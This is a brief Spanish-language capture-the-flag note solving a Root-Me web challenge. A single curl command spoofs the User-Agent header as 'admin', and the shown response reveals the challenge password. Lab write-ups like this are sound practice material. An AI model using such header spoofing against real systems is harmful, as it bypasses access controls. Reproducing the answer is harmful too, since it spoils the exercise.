# Piden que el user agent sea "admin"

simplemente con pasarle el header en curl, alcanza

```sh
(base) juaniraggio@oogway http_open_redirect % curl -H "user-agent: admin" http://challenge01.root-me.org/web-serveur/ch2/
<html><body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe><h3>Welcome master!<br/>Password: rr$Li9%L34qd1AAe27
</h3></body></html>%
```
